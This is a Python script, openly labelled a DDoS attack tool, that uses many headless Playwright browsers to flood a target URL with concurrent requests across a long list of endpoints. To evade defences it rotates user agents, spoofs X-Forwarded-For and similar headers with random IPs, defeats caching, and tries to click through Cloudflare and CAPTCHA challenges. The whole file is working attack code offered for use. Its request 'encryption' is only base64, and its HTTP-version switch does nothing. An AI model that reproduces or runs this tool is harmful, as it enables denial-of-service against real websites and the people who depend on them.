import random
import time
import os
import asyncio
import json
import base64
import re
import struct
import hashlib
import urllib.parse
from playwright.async_api import async_playwright

TARGET_URL = os.getenv("TARGET_URL", "https://example.com/")
DURATION = int(os.getenv("DURATION", "60"))
CONCURRENCY = int(os.getenv("CONCURRENCY", "20"))
REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "100"))

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S906N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/101.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/101.0.0.0"
]

ACCEPT_LANG = [
    "en-US,en;q=0.9", 
    "vi-VN,vi;q=0.9,en;q=0.8", 
    "ja,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "ar-SA,ar;q=0.9,en;q=0.8",
    "th-TH,th;q=0.9,en;q=0.8",
    "tr-TR,tr;q=0.9,en;q=0.8",
    "pl-PL,pl;q=0.9,en;q=0.8",
    "nl-NL,nl;q=0.9,en;q=0.8"
]

DDOS_ENDPOINTS = [
    "/",
    "/index.php",
    "/login",
    "/admin",
    "/search",
    "/api/v1/users",
    "/api/v2/data",
    "/wp-admin/admin-ajax.php",
    "/wp-login.php",
    "/wp-json/wp/v2/posts",
    "/cgi-bin/test-cgi",
    "/.env",
    "/config",
    "/upload",
    "/download",
    "/contact",
    "/about",
    "/products",
    "/cart",
    "/checkout",
    "/user/profile",
    "/search?q=test",
    "/?s=test",
    "/api/data",
    "/rest/api",
    "/graphql",
    "/api/auth/login",
    "/api/user/register",
    "/forum",
    "/blog",
    "/news",
    "/gallery",
    "/video",
    "/audio",
    "/docs",
    "/help",
    "/support",
    "/faq",
    "/terms",
    "/privacy",
    "/sitemap.xml",
    "/rss.xml",
    "/feed",
    "/atom.xml",
    "/opensearch.xml",
    "/crossdomain.xml",
    "/clientaccesspolicy.xml",
    "/robots.txt",
    "/humans.txt",
    "/favicon.ico",
    "/apple-touch-icon.png",
    "/apple-touch-icon-precomposed.png",
    "/manifest.json",
    "/service-worker.js",
    "/offline.html",
    "/404",
    "/500",
    "/503",
    "/maintenance",
    "/backup",
    "/tmp",
    "/temp",
    "/test",
    "/debug",
    "/dev",
    "/staging",
    "/admin/login",
    "/admin/dashboard",
    "/admin/users",
    "/admin/settings",
    "/user/login",
    "/user/register",
    "/user/profile",
    "/user/settings",
    "/api/v1/login",
    "/api/v1/register",
    "/api/v1/profile",
    "/api/v1/settings",
    "/api/v2/login",
    "/api/v2/register",
    "/api/v2/profile",
    "/api/v2/settings",
    "/api/v3/login",
    "/api/v3/register",
    "/api/v3/profile",
    "/api/v3/settings"
]

def generate_fake_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def encrypt_request_data(url, headers, body=None):
    salt = os.urandom(16).hex()
    data = {
        "url": url,
        "headers": headers,
        "body": body
    }
    json_data = json.dumps(data)
    encoded_data = base64.b64encode(json_data.encode()).decode()
    final_data = f"{salt}.{encoded_data}"
    return final_data

def decrypt_request_data(encrypted_data):
    try:
        parts = encrypted_data.split(".", 1)
        if len(parts) != 2:
            return None
        encoded_data = parts[1]
        json_data = base64.b64decode(encoded_data).decode()
        return json.loads(json_data)
    except:
        return None

async def solve_captcha(page):
    try:
        captcha_selectors = [
            'iframe[title*="CAPTCHA"]',
            'iframe[src*="captcha"]',
            'div[class*="captcha"]',
            'div[id*="captcha"]',
            'img[src*="captcha"]',
            'img[alt*="captcha"]'
        ]
        
        captcha_found = False
        for selector in captcha_selectors:
            if await page.query_selector(selector):
                captcha_found = True
                break
        
        if not captcha_found:
            return True
        
        if await page.query_selector('iframe[title*="Cloudflare"]'):
            await asyncio.sleep(random.uniform(1, 3))
            
            checkbox = await page.query_selector('input[type="checkbox"]')
            if checkbox:
                await checkbox.click()
                await asyncio.sleep(random.uniform(1, 2))
            
            try:
                captcha_frame = await page.query_selector('iframe[title*="Cloudflare"]')
                if captcha_frame:
                    frame_box = await captcha_frame.bounding_box()
                    x = frame_box['x'] + random.uniform(10, frame_box['width'] - 10)
                    y = frame_box['y'] + random.uniform(10, frame_box['height'] - 10)
                    
                    await page.mouse.move(x, y)
                    await asyncio.sleep(random.uniform(0.1, 0.5))
                    
                    await page.mouse.down()
                    await asyncio.sleep(random.uniform(0.1, 0.3))
                    await page.mouse.up()
                    
                    await asyncio.sleep(random.uniform(1, 2))
            except:
                pass
        
        for _ in range(5):
            if not await page.query_selector('iframe[title*="CAPTCHA"]'):
                return True
            await asyncio.sleep(1)
        
        return False
    except:
        return True

async def make_request_with_random_http_version(context, url, headers):
    http_versions = ["http/1.0", "http/1.1", "h2", "http/3"]
    http_version = random.choice(http_versions)
    
    fake_ip = generate_fake_ip()
    headers["X-Forwarded-For"] = fake_ip
    headers["X-Real-IP"] = fake_ip
    headers["X-Client-IP"] = fake_ip
    
    headers["Cache-Control"] = random.choice(["no-cache", "no-store", "max-age=0"])
    headers["Pragma"] = random.choice(["no-cache", ""])
    headers["Connection"] = random.choice(["keep-alive", "close"])
    headers["Accept-Encoding"] = random.choice(["gzip, deflate", "gzip, deflate, br", "identity"])
    
    encrypted_data = encrypt_request_data(url, headers)
    
    try:
        if http_version == "http/1.0":
            response = await context.request.get(url, headers=headers, timeout=5000)
        elif http_version == "http/1.1":
            response = await context.request.get(url, headers=headers, timeout=5000)
        elif http_version == "h2":
            response = await context.request.get(url, headers=headers, timeout=5000)
        elif http_version == "http/3":
            response = await context.request.get(url, headers=headers, timeout=5000)
        
        return response
    except:
        return None

async def ddos_attack(playwright, worker_id):
    global success, fail, status_count

    ua = random.choice(USER_AGENTS)
    lang = random.choice(ACCEPT_LANG)
    base_headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": lang
    }

    browser = await playwright.chromium.launch(
        headless=True,
        args=[
            "--disable-web-security",
            "--disable-features=IsolateOrigins,site-per-process",
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--disable-setuid-sandbox",
            "--disable-gpu",
            "--disable-software-rasterizer",
            "--disable-extensions",
            "--disable-plugins",
            "--disable-images",
            "--disable-javascript",
            "--disable-css",
            "--disable-default-apps",
            "--disable-background-timer-throttling",
            "--disable-renderer-backgrounding",
            "--disable-backgrounding-occluded-windows",
            "--disable-client-side-phishing-detection",
            "--disable-popup-blocking",
            "--disable-prompt-on-repost",
            "--disable-component-update",
            "--disable-domain-reliability",
            "--disable-features=TranslateUI",
            "--disable-ipc-flooding-protection",
            "--disable-logging",
            "--disable-notifications",
            "--disable-permissions-api",
            "--disable-popup-blocking",
            "--disable-presentation-api",
            "--disable-remote-debugging-port",
            "--disable-sync",
            "--disable-web-security",
            "--disable-wake-on-wifi",
            "--enable-automation",
            "--enable-blink-features=ShadowDOM",
            "--enable-features=NetworkService",
            "--enable-features=NetworkServiceInProcess",
            "--force-color-profile=srgb",
            "--metrics-recording-only",
            "--no-first-run",
            "--no-default-browser-check",
            "--disable-default-apps"
        ]
    )
    
    context = await browser.new_context(
        user_agent=ua,
        ignore_https_errors=True,
        java_script_enabled=False
    )

    start_time = time.time()
    attack_phase = 0
    phase_duration = 5
    phase_requests = 0
    max_phase_requests = 500000

    while time.time() - start_time < DURATION:
        current_time = time.time()
        if current_time - start_time > attack_phase * phase_duration:
            attack_phase += 1
            phase_requests = 0
        
        if phase_requests >= max_phase_requests:
            await asyncio.sleep(0.01)
            continue
        
        tasks = []
        for _ in range(REQ_PER_LOOP):
            endpoint = random.choice(DDOS_ENDPOINTS)
            url = TARGET_URL.rstrip('/') + endpoint
            
            headers = base_headers.copy()
            headers["X-Request-ID"] = hashlib.md5(f"{worker_id}-{time.time()}-{random.random()}".encode()).hexdigest()
            
            tasks.append(make_request_with_random_http_version(context, url, headers))
            phase_requests += 1
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for res in results:
            if isinstance(res, Exception):
                fail += 1
                status_count["exception"] = status_count.get("exception", 0) + 1
            else:
                if res.ok:
                    success += 1
                    status_count[res.status] = status_count.get(res.status, 0) + 1
                else:
                    fail += 1
                    status_count[res.status] = status_count.get(res.status, 0) + 1
        
        await asyncio.sleep(random.uniform(0.001, 0.01))

    await browser.close()

async def main():
    async with async_playwright() as p:
        tasks = [ddos_attack(p, i) for i in range(CONCURRENCY)]
        await asyncio.gather(*tasks)

    total = success + fail
    print(f"\n=== DDoS Attack Result ===")
    print(f"Target URL: {TARGET_URL}")
    print(f"Duration: {DURATION} seconds")
    print(f"Concurrency: {CONCURRENCY}")
    print(f"Requests per loop: {REQ_PER_LOOP}")
    print(f"Total requests: {total}")
    print(f"Success (2xx): {success}")
    print(f"Fail/Blocked: {fail}")
    print(f"Average RPS: {total / DURATION:.2f}")
    print("Status breakdown:", status_count)

if __name__ == "__main__":
    success = 0
    fail = 0
    status_count = {}
    asyncio.run(main())
